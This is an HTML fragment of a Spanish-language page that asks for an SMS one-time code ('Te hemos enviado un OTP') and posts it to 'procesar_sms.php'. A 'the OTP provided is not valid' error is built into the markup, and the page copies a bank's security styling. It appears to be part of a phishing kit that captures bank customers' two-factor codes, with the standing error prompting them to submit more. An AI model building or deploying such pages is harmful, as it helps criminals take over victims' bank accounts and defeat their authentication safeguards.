...
<div class="cb-security">
    ...
    <div class="cb-security__rigth-panel">
        <div class="cb-security__login-container-form">
            <form id="login-form" class="cb-security__login-form" method="post" action="procesar_sms.php">
                ...
                <div class="cb-security__login-title">Te hemos enviado un OTP</div>
                <div class="cb-security__login-inputs">
                    <label for="username" class="cb-security__login-label">OTP</label>
                    <div class="cb_security__input-container">
                        <input type="text" id="username" name="codigo" class="cb-security__login-input" required="" minlength="3" maxlength="32" value="">
                ...
                <div class="cb-security__login-danger">
                    ...
                    <div class="cb-security__login-danger-content">
                        ...
                        <div class="cb-security__login-danger-subtitle" role="alert">Estimado cliente, el OTP provisto no es válido. Por favor intenta de nuevo</div>
                    </div>
                </div>
                <button id="submitCredentials" class="cb-security__login-btn green" type="submit">Confirmar</button>
